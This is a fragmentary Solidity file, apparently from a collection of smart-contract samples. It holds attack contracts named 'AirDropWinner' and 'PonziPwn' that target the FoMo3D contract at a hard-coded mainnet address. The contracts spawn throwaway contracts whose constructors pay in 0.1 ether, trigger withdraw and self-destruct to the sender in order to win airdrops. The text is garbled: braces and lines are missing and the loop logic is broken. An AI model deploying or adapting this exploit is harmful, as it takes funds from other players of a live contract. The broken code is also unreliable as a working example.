3050.sol
function withdraw() external;
contract BlankContract {
constructor() public {}
contract AirDropWinner {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
constructor() public {
if(!address(fomo3d).call.value(0.1 ether)()) {
fomo3d.withdraw();
selfdestruct(msg.sender);
contract PonziPwn {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
address private admin;
uint256 private blankContractGasLimit = 20000;
uint256 private pwnContractGasLimit = 250000;
uint256 private gasPrice = 10;
uint256 private gasPriceInWei = gasPrice*1e9;
uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
uint256 private maxAmount = 10 ether;
modifier onlyAdmin() {
require(msg.sender == admin);
constructor() public {
admin = msg.sender;
function deployContracts(uint256 _nContracts,address _newSender) private {
for(uint256 _i; _i < _nContracts; _i++) {
if(_i++ == _nContracts) {
address(_newSender).call.value(0.1 ether)();
new AirDropWinner();
new BlankContract();
